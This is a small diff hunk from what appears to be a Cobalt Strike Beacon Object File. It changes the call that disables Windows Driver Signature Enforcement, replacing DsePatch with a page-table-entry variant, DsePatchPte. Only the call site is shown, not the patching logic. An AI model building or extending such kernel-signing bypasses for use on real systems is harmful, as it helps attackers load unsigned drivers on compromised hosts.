@@ -311,8 +311,9 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 								&ProcIn
 						) )
 						{
-							if ( ! ApiTbl.NtWaitForSingleObject( ProcIn.hThread, FALSE, NULL ) ) {
-								DsePatch( BeaconApi, &ApiTbl );
+							if ( ! ApiTbl.NtWaitForSingleObject( ProcIn.hThread, FALSE, NULL ) ) 
+							{
+								DsePatchPte( BeaconApi, &ApiTbl );
 							} else {
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "wait was aborted unexpectedly." ) ) );
 								goto Leave;
